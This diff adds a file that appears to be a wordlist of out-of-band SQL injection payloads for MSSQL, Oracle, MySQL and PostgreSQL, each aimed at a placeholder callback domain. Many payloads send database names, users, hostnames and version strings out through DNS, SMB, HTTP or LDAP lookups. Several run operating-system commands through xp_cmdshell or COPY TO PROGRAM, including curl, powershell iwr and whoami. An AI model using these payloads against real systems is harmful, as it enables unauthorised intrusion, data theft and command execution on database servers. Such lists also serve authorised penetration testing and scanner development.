@@ -1,0 +1,79 @@
+#  This list we will using with SQL Injection the Out-of-Band SQL Injection (OOB) SQL Injection type ( The section follows the SQL Injection)
+
+'; exec master..xp_dirtree '\\Ngrok-DOAMIN\test'--
+'; exec xp_fileexist '\\Ngrok-DOAMIN\test'--
+'; exec master..xp_subdirs '\\Ngrok-DOAMIN\test'--
+'||UTL_INADDR.get_host_address('Ngrok-DOAMIN')--
+'||UTL_HTTP.request('http://Ngrok-DOAMIN')--
+'||DBMS_LDAP.INIT('Ngrok-DOAMIN',389)--
+'; exec master..xp_cmdshell 'powershell iwr http://Ngrok-DOAMIN'--
+'; exec xp_cmdshell 'curl http://Ngrok-DOAMIN'--
+'||UTL_HTTP.request('http://Ngrok-DOAMIN/?'||user)--
+'; SELECT pg_read_file('http://Ngrok-DOAMIN')--
+'; IF (1=1) WAITFOR DELAY '0:0:5'; exec xp_dirtree '\\Ngrok-DOAMIN\test'--
+'||DBMS_LOCK.SLEEP(5)||UTL_INADDR.get_host_address('Ngrok-DOAMIN')--
+' UNION SELECT LOAD_FILE('\\\\Ngrok-DOAMIN\\share')--
+'||EXTRACTVALUE(XMLTYPE('<!DOCTYPE r SYSTEM "http://Ngrok-DOAMIN">'),'/l')--
+' AND (SELECT COUNT(*) FROM sysobjects WHERE name LIKE '%'+(SELECT @@version)+'%')--
+'; exec master..xp_dirtree '\\Ngrok-DOAMIN\'+(SELECT DB_NAME())+'\'--
+'||UTL_INADDR.get_host_name('Ngrok-DOAMIN')--
+'||DBMS_UTILITY.get_parameter_value('service_names')--
+'||DBMS_XMLGEN.getXML('SELECT ''http://Ngrok-DOAMIN'' FROM dual')--
+' AND EXISTS (SELECT * FROM OPENROWSET(BULK '\\Ngrok-DOAMIN\test', SINGLE_BLOB) a)--
+'; DECLARE @p VARCHAR(255); SET @p='\\Ngrok-DOAMIN\test'; EXEC master..xp_fileexist @p--
+'; COPY (SELECT current_user) TO PROGRAM 'ping Ngrok-DOAMIN'--
+'; COPY (SELECT version()) TO PROGRAM 'curl http://Ngrok-DOAMIN'--
+' UNION SELECT LOAD_FILE(CONCAT('\\\\Ngrok-DOAMIN\\',(SELECT user())))--
+' AND LOAD_FILE(CONCAT('\\\\Ngrok-DOAMIN\\',(SELECT @@hostname)))--
+'||UTL_HTTP.request('http://Ngrok-DOAMIN/?'||SYS_CONTEXT('USERENV','DB_NAME'))--
+'||UTL_HTTP.request('http://Ngrok-DOAMIN/?'||SYS_CONTEXT('USERENV','SESSION_USER'))--
+'; EXEC xp_cmdshell 'nslookup Ngrok-DOAMIN'--
+'||XMLTYPE('<!DOCTYPE a SYSTEM "http://Ngrok-DOAMIN">')--
+'||EXTRACTVALUE(XMLTYPE('<!DOCTYPE a SYSTEM "http://Ngrok-DOAMIN">'),'/a')--
+'; exec master..xp_dirtree '\\Ngrok-DOAMIN\a'--
+'; exec master..xp_dirtree '\\Ngrok-DOAMIN\'+DB_NAME()+'\'--
+'; exec master..xp_dirtree '\\Ngrok-DOAMIN\'+SYSTEM_USER+'\'--
+'; exec master..xp_fileexist '\\Ngrok-DOAMIN\b'--
+'; exec master..xp_subdirs '\\Ngrok-DOAMIN\c'--
+'; EXEC xp_cmdshell 'ping Ngrok-DOAMIN'--
+'; EXEC xp_cmdshell 'curl http://Ngrok-DOAMIN'--
+'; EXEC xp_cmdshell 'powershell iwr http://Ngrok-DOAMIN'--
+' AND EXISTS(SELECT * FROM OPENROWSET(BULK '\\Ngrok-DOAMIN\d', SINGLE_BLOB) a)--
+' AND 1=(SELECT COUNT(*) FROM OPENROWSET(BULK '\\Ngrok-DOAMIN\e', SINGLE_CLOB) a)--
+' UNION SELECT LOAD_FILE('\\\\Ngrok-DOAMIN\\f')--
+' AND LOAD_FILE(CONCAT('\\\\Ngrok-DOAMIN\\',database()))--
+' AND LOAD_FILE(CONCAT('\\\\Ngrok-DOAMIN\\',user()))--
+' AND LOAD_FILE(CONCAT('\\\\Ngrok-DOAMIN\\',@@hostname))--
+'; COPY (SELECT '') TO PROGRAM 'ping Ngrok-DOAMIN'--
+'; COPY (SELECT current_user) TO PROGRAM 'nslookup Ngrok-DOAMIN'--
+'; IF (1=1) WAITFOR DELAY '0:0:5'; exec master..xp_dirtree '\\Ngrok-DOAMIN\g'--
+'; exec master..xp_dirtree '\\Ngrok-DOAMIN\oob1\'--
+'; exec master..xp_dirtree '\\Ngrok-DOAMIN\'+@@servername+'\'--
+'; exec master..xp_dirtree '\\Ngrok-DOAMIN\'+SUSER_SNAME()+'\'--
+'; exec master..xp_fileexist '\\Ngrok-DOAMIN\oob2\'--
+'; exec master..xp_fileexist '\\Ngrok-DOAMIN\'+HOST_NAME()+'\'--
+'; EXEC xp_cmdshell 'whoami & nslookup Ngrok-DOAMIN'--
+'; EXEC xp_cmdshell 'ping -n 1 Ngrok-DOAMIN'--
+'; EXEC xp_cmdshell 'curl http://Ngrok-DOAMIN/%USERNAME%'--
+' AND 1=(SELECT * FROM OPENROWSET(BULK '\\Ngrok-DOAMIN\oob3', SINGLE_BLOB) x)--
+' AND EXISTS(SELECT * FROM OPENROWSET(BULK '\\Ngrok-DOAMIN\oob4', SINGLE_CLOB) y)--
+' UNION SELECT LOAD_FILE(CONCAT('\\\\Ngrok-DOAMIN\\',@@version))--
+' UNION SELECT LOAD_FILE(CONCAT('\\\\Ngrok-DOAMIN\\',schema()))--
+' AND LOAD_FILE(CONCAT('\\\\Ngrok-DOAMIN\\',(SELECT DATABASE())))--
+'||UTL_HTTP.request('http://Ngrok-DOAMIN/oob')--
+'||UTL_HTTP.request('http://Ngrok-DOAMIN/?'||SYS_CONTEXT('USERENV','SESSIONID'))--
+'||UTL_HTTP.request('http://Ngrok-DOAMIN/?'||SYS_CONTEXT('USERENV','OS_USER'))--
+'||DBMS_LDAP.INIT('Ngrok-DOAMIN',80)--
+'||XMLTYPE('<!DOCTYPE x SYSTEM "http://Ngrok-DOAMIN/oob">')--
+'||EXTRACTVALUE(XMLTYPE('<!DOCTYPE x SYSTEM "http://Ngrok-DOAMIN/oob">'),'/x')--
+'; COPY (SELECT '') TO PROGRAM 'curl http://Ngrok-DOAMIN/oob'--
+'; COPY (SELECT current_database()) TO PROGRAM 'nslookup Ngrok-DOAMIN'--
+'; IF (1=1) WAITFOR DELAY '0:0:3'; exec master..xp_fileexist '\\Ngrok-DOAMIN\oob5\'--
+'||DBMS_LOCK.SLEEP(3)||UTL_HTTP.request('http://Ngrok-DOAMIN/oob')--
+'<operator> FUNCTION_THAT_CALLS_NETWORK("Ngrok-DOAMIN/ID")--
+'||FUNCTION('http://Ngrok-DOAMIN/?'|| DYNAMIC_DATA ||')--
+'<operator> LOAD_FILE('\\\\Ngrok-DOAMIN\\'|| DYNAMIC_DATA +'')--
+'||EXTRACTVALUE(XMLTYPE('<!DOCTYPE x SYSTEM "http://Ngrok-DOAMIN/?'||DYNAMIC_DATA||'">'),'/x')--
+'; COPY (SELECT data) TO PROGRAM 'nslookup Ngrok-DOAMIN'--
+'; EXEC shellcommand_that_hits 'http://Ngrok-DOAMIN/ID'--
+'||FUNCTION_THAT_CALLS_NETWORK('http://Ngrok-DOAMIN/?'|| DATA ||')--
